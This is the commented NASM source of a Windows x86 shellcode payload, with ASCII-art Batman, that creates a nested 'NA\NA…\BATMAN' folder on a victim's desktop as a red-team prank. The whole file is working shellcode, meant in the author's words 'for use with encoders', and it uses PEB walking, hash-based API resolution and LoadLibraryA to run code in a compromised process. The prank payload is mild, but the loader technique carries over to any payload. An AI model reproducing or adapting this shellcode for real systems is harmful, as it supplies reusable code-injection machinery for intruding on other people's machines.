;
;                 ..oo$00ooo..                    ..ooo00$oo..
;              .o$$$$$$$$$'                          '$$$$$$$$$o.
;           .o$$$$$$$$$"             .   .              "$$$$$$$$$o.
;         .o$$$$$$$$$$~             /$   $\              ~$$$$$$$$$$o.
;       .{$$$$$$$$$$$.              $\___/$               .$$$$$$$$$$$}.
;      o$$$$$$$$$$$$8              .$$$$$$$.               8$$$$$$$$$$$$o
;     $$$$$$$$$$$$$$$              $$$$$$$$$               $$$$$$$$$$$$$$$
;    o$$$$$$$$$$$$$$$.             o$$$$$$$o              .$$$$$$$$$$$$$$$o
;    $$$$$$$$$$$$$$$$$.           o{$$$$$$$}o            .$$$$$$$$$$$$$$$$$
;   ^$$$$$$$$$$$$$$$$$$.         J$$$$$$$$$$$L          .$$$$$$$$$$$$$$$$$$^
;   !$$$$$$$$$$$$$$$$$$$$oo..oo$$$$$$$$$$$$$$$$$oo..oo$$$$$$$$$$$$$$$$$$$$$!
;   {$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$}
;   6$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$?
;   '$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
;    o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o
;     $$$$$$$$$$$$$$;'~`^Y$$$7^''o$$$$$$$$$$$o''^Y$$$7^`~';$$$$$$$$$$$$$$$
;     '$$$$$$$$$$$'       `$'    `'$$$$$$$$$'     `$'       '$$$$$$$$$$$$'
;      !$$$$$$$$$7         !       '$$$$$$$'       !         V$$$$$$$$$!
;       ^o$$$$$$!                   '$$$$$'                   !$$$$$$o^
;         ^$$$$$"                    $$$$$                    "$$$$$^
;           'o$$$`                   ^$$$'                   '$$$o'
;             ~$$$.                   $$$.                  .$$$~
;               '$;.                  `$'                  .;$'
;                  '.                  !                  .`
;
; Hackers need to use more Batman. Here is some shellcode to use more Batman.
; This creates the following directory on the user's desktop:
;
;     NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\NA\BATMAN
;
; Inspired by the CCDC Red Team's frequent use of Batman when rockin' the boxen
; of the blue teams.
;
; 328 bytes, nullbytes all over the place. Intended for use with encoders.
;
; /\oo/\ -- flap flap bitches!
;
; frank2 <frank2 [N] dc949 [A] org>

      global main

_main:
      jmp   dataOffset

getFuncByHash:
      mov   esi,[esp+8]
      mov   edi,[esi+0x3C]       ; dos->e_lfanew 
      add   edi,esi
      mov   ecx,[edi+0x78]       ; export data 
      add   ecx,esi
      mov   ebx,[ecx+0x20]       ; AddressOfNames 
      add   ebx,esi
      xor   eax,eax
      push  ecx

searchForFunc:
      mov   edx,[ebx+eax*4]
      add   edx,esi
      mov   edi,0x554E4441

hashString:
      movzx ecx,byte [edx]
      test  ecx,ecx
      jz    short finishHash

rolRolFightDaPowa:
      xor   edi,ecx
      rol   edi,cl
      shr   ecx,1
      jnz   short rolRolFightDaPowa
      inc   edx
      jmp   short hashString

finishHash:
      or    edi,0x10101010
      cmp   edi,[esp+8]
      jz    short foundHash
      inc   eax
      jmp   short searchForFunc

foundHash:
      pop   ebx
      mov   edi,[ebx+0x1c]
      add   edi,esi
      mov   ebx,[ebx+0x24]
      add   ebx,esi
      movzx ebx,word [ebx+eax*2]
      mov   ebx,[edi+ebx*4]
      add   ebx,esi
      pop   eax                        ; fix the stack 
      pop   edx                        ; no idea why I did it this way 
      pop   edx                        ; but I had some reason... 
      push  eax                        ; it had to do with null bytes 
      ret                        

beginCode:
      pop   ebp
      xor   eax,eax
      xor   ebx,ebx
      xor   ecx,ecx
      mov   cx,0x104                   ; MAX_PATH 
      mov   bl,0x2C                    ; offset to our path variable 
      lea   edi,[ebp+ebx]              ; directory string      
      repne stosb                      ; memset the directory string to 0     
      mov   esi,[fs:ecx+0x30]          ; PEB 
      mov   esi,[esi+0xC]              ; Ldr 
      mov   esi,[esi+0xC]              ; linked list of loaded modules 
      mov   esi,[esi]                  ; loader info for ntdll.dll 
      push  dword [esi+0x18]           ; ntdll.dll image data 
      mov   esi,[esi]                  ; loader info for kernel32.dll 
      push  dword [esi+0x18]           ; kernel32.dll image data 
      push  dword [esp]                ; "                     " 
      push  dword [ebp]                ; ExitThread hash 
      call  getFuncByHash
      cmp   dword [ebx],0x4C44544E     ; if this is the real ExitThread, it 
                                       ;    won't start with NTDL 
      jnz   hasExitThread              ; we have ExitThread, resume 
      push  dword [esp+4]              ; ntdll.dll image data 
      push  dword [ebp+4]              ; RtlExitUserThread hash 
      call  getFuncByHash

hasExitThread:
      mov   [ebp],ebx                  ; store the exit func here 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+8]              ; LoadLibraryA hash 
      call  getFuncByHash
      mov   [ebp+8],ebx                ; store LoadLibraryA function 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+0xC]            ; CreateDirectoryA hash 
      call  getFuncByHash
      mov   [ebp+0xC],ebx              ; store CreateDirectoryA function 

      lea   eax,[ebp+0x14]             ; shell32.dll string 
      push  eax
      call  [ebp+8]                    ; load shell32.dll 
      push  eax                        ; shell32.dll image data 
      push  dword [ebp+0x10]           ; SHGetSpecialFolderPathA hash 
      call  getFuncByHash
      mov   [ebp+0x10],ebx             ; SHGetSpecialFolderPathA function 

      xor   eax,eax
      push  eax                        ; fCreate = FALSE
      push  0x10                       ; csidl = CSIDL_DESKTOPDIRECTORY 
      lea   edi,[ebp+0x2C]             ; our directory string 
      push  edi                        ; lpszPath = [ebp+0x2C] 
      push  eax                        ; hwndOnwer = NULL 
      call  [ebp+0x10]                 ; SHGetSpecialFolderPathA call
      dec   eax                        ; return value should be true 
      xor   ecx,ecx
      mov   cx,0x104                   ; MAX_PATH 
      repne scasb                      ; find the null byte
      dec   edi                        ; point at the null byte

      push  0x10                       ; edx is volatile :( so use the stack!
      lea   ebx,[ebp+0x2C]             ; but ebx is nonvolatile! :D

naNaNaNa:
      lea   esi,[ebp+0x20]             ; "\NA" string 
      movsd                            ; copy in the "\NA" string 
      xor   eax,eax                    
      push  eax                        ; lpSecurityAttributes = NULL  
      push  ebx                        ; lpPathName = ebx 
      call  [ebp+0xC]                  ; CreateDirectoryA(ebx, NULL) 
      dec   edi                        
      dec   dword [esp]
      jnz   naNaNaNa                   

      pop   ecx                        ; pop our counter from the stack
      mov   cl,8                       
      lea   esi,[ebp+0x24]             ; na, na, na, na 
      repne movsb                      ; na, na, na, na 
      push  ecx                        ; na, na, na, na 
      push  ebx                        ; na, na, na, na 
      call [ebp+0xC]                   ; BATMAN!! 

      xor   eax,eax
      push  eax
      call [ebp]                       ; the masked knight return another day... 
dataOffset:
      call  beginCode

      dd    0x58159F36                 ; ExitThread
      dd    0x795D941E                 ; RtlExitUserThread
      dd    0xF816FF93                 ; LoadLibraryA
      dd    0x903D50B3                 ; CreateDirectoryA
      dd    0xD4155CDB                 ; SHGetSpecialFolderPathA
      db    "shell32.dll",0
      db    "\NA",0
      db    "\BATMAN",0
